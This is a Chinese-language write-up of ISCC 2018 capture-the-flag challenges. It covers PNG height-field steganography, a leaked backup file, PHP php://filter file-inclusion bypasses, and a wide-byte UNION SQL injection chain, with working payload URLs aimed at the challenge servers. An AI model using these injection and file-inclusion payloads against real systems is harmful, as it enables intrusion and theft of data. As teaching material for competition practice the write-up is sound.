ISCC 2018 WP

打iscc对我这样的萌新是比较友好滴，最起码精神上没感觉到不舒服。。。话不多说，上writeup。

Misc

0x01 Where is the FLAG？

一道隐写题，手指指向很明确了。修改图片高度像素
用winhex打开：
(https://ww1.sinaimg.cn/large/006Y5bsfly1fr776f6kymj30ih03yq33.jpg) 00 00 00 0D 说明IHDR头块长为13

49 48 44 52 IHDR标识

00 00 02 72 图像的宽

00 00 01 F4 图像的高

把图片的高改大点即可得
(https://ww1.sinaimg.cn/large/006Y5bsfly1fr778jv9yaj30kc0k5q3l.jpg) 剩下的提交答案就随缘了哈哈，格式不一我也是醉了

0x04 你能跨过去吗？

这道题是最迷的一道题，还以为是XSS，看到页面里面有一段URL，感觉后面那点有点像base64，拿去解码一下
(https://ww1.sinaimg.cn/large/006Y5bsfly1fr77apyjgpj317w0cimxx.jpg) 解密结果复制到记事本里即可看到正常结果

发现那个输入框怎么输都不对，看了一下题目，找到key提交即可。。。。这题的意义在哪里。

0x05 一切都是套路

题目说是文件泄漏，所以找一找常见的文件泄漏，发现是txt文件泄漏（真是不走心。。。。）
用御剑后台扫描发现存在index.php，flag.php，然后我输入index.php.txt惊喜的发现了忘删的文件：
(https://ww1.sinaimg.cn/large/006Y5bsfly1fr77bczbn8j30i40lwjsw.jpg) 。经过测试只有把flag的值赋给$_200可以得到flag
(https://ww1.sinaimg.cn/large/006Y5bsfly1fr77bkxfmpj31320c774w.jpg)

0x06 你能绕过吗?

(大佬思路)这道题卡了好久，一直以为是注入，试了很多注入的点，感觉是一点都没有办法，就换了一下思路，通过各种测试，最后总结出来，后台会将f参数的值加上.php以后去请求，有sleep会延迟10s，后台有intval数字型没法注入。

之前是了一次f参数用伪协议读一遍，但是出现error以后以为自己想错了，就没有在伪协议这里做文章，万万没想到是过滤了php(太菜.jpg)

直接给payload吧：https://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&id=1

0x10 SQL注入的艺术

(https://ww1.sinaimg.cn/large/006Y5bsfly1fr77citk9gj30mn0beaa7.jpg) 试了一下发现是宽字节注入，，，df好像显示不出来

https://118.190.152.202:8015/index.php?id=1%df' 1=1%23返回正常
https://118.190.152.202:8015/index.php?id=1%df' 1=2%23返回错误

接下来就是日常操作了。。。
https://118.190.152.202:8015/index.php?id=1%df' order by 8%23不报错，证明有8列(8列。。。。出题人有毒吧)

https://118.190.152.202:8015/index.php?id=-1%df' select 1,2,3,4,5,6,7,8%23

发现2,7,8是显示位，随便找个显示位注就行了。。。

爆数据库名：https://118.190.152.202:8015/index.php?id=-1%df' union select 1,database(),3,version(),5,6,7,8 %23

爆表名：https://118.190.152.202:8015/index.php?id=-1%df' union select 1,(select table_name from information_schema.tables where table_schema=database()),3,version(),5,6,7,8 %23

爆字段名：https://118.190.152.202:8015/index.php?id=-1%df' union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns where table_schema=database()%23

爆flag：https://118.190.152.202:8015/index.php?id=-1%df' union select 1,group_concat(flag),3,4,5,6,7,8 from baji.admins %23

0x11 试试看

源码如下：（学长找的）
(https://ww1.sinaimg.cn/large/006Y5bsfly1fr77crcknxj30z30qj76r.jpg) 进去以后一个美图，然后看一下源码，看到有个img的路径的东西，点击以后进入到URL为：

https://118.190.152.202:8006/show.php?img=1.jpg 的界面，看到这个URL，妥妥的文件包含好吗，然后就开始各种疯狂尝试，用php://filter读各种文件，读图片的话还是图片，没卵用，读show.php直接告诉我文件不存在，折腾了大半天，实在没招了，然后问了pupil师傅，告诉我resource可以指定两个。。。。。然后构造payload:https://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=show.php ，成功读取到了文件

然后直接读../flag.php就可以得到flag，最终payload: https://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=1.jpg/resource=../flag.php
